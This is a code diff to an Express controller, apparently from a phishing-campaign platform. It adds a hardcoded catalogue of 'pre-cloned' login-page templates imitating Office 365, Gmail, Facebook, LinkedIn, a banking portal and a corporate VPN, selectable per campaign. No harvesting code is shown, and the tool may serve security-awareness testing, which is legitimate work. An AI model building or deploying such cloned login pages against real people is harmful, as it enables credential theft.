@@ -1,5 +1,4 @@
-// src/controllers/LandingPageController.js
-const Campaign = require('../models/Campaign');
+const Campaign = require('../models/Campaign'); 
 const ScrapingService = require('../services/ScrapingService');
 const { validationResult } = require('express-validator');
 
@@ -181,9 +180,9 @@ class LandingPageController {
       }
 
       const { campaignId } = req.params;
-      const { template } = req.body;
+      const { templateId } = req.body; // MODIFICATION ICI: Récupère templateId
 
-      console.log(`📋 Sélection du template ${template.name} (${template.url}) pour la campagne ${campaignId}`);
+      console.log(`📋 Sélection du template avec ID: ${templateId} pour la campagne ${campaignId}`);
 
       // Vérifier que la campagne existe
       const campaign = await Campaign.findById(campaignId);
@@ -191,6 +190,25 @@ class LandingPageController {
         return res.status(404).json({
           success: false,
           message: 'Campagne non trouvée'
+        });
+      }
+
+      // MODIFICATION ICI: Récupère la liste des templates et trouve le template par ID
+      const availableTemplates = [
+        { id: 1, name: "Page de connexion Office 365", url: `${process.env.BASE_URL}/static-cloned-templates/office365-login.html`, thumbnail: "https://via.placeholder.com/300x200/1e40af/ffffff?text=Office+365", category: "Microsoft", popularity: 5, description: "Page de connexion Microsoft Office 365 classique (pré-clonée)" },
+        { id: 2, name: "Gmail Login", url: `${process.env.BASE_URL}/static-cloned-templates/gmail-login.html`, thumbnail: "https://via.placeholder.com/300x200/dc2626/ffffff?text=Gmail", category: "Google", popularity: 4, description: "Page de connexion Gmail avec authentification (pré-clonée)" },
+        { id: 3, name: "Facebook Login", url: `${process.env.BASE_URL}/static-cloned-templates/facebook-login.html`, thumbnail: "https://via.placeholder.com/300x200/1877f2/ffffff?text=Facebook", category: "Social Media", popularity: 3, description: "Page de connexion Facebook mobile et desktop (pré-clonée)" },
+        { id: 4, name: "LinkedIn Login", url: `${process.env.BASE_URL}/static-cloned-templates/linkedin-login.html`, thumbnail: "https://via.placeholder.com/300x200/0077b5/ffffff?text=LinkedIn", category: "Professional", popularity: 4, description: "Page de connexion LinkedIn professionnelle (pré-clonée)" },
+        { id: 5, name: "Banking Portal", url: `${process.env.BASE_URL}/static-cloned-templates/banking-portal.html`, thumbnail: "https://via.placeholder.com/300x200/059669/ffffff?text=Banking", category: "Finance", popularity: 2, description: "Portail bancaire générique avec authentification forte (pré-clonée)" },
+        { id: 6, name: "Corporate VPN", url: `${process.env.BASE_URL}/static-cloned-templates/corporate-vpn.html`, thumbnail: "https://via.placeholder.com/300x200/7c3aed/ffffff?text=VPN", category: "Enterprise", popularity: 3, description: "Page de connexion VPN d'entreprise (pré-clonée)" }
+      ];
+      const template = availableTemplates.find(t => t.id == templateId); // Utilise == pour comparaison lâche (nombre vs chaîne)
+
+      if (!template) {
+        console.log(`❌ Template non trouvé avec ID: ${templateId}`);
+        return res.status(404).json({
+          success: false,
+          message: 'Template non trouvé'
         });
       }
 
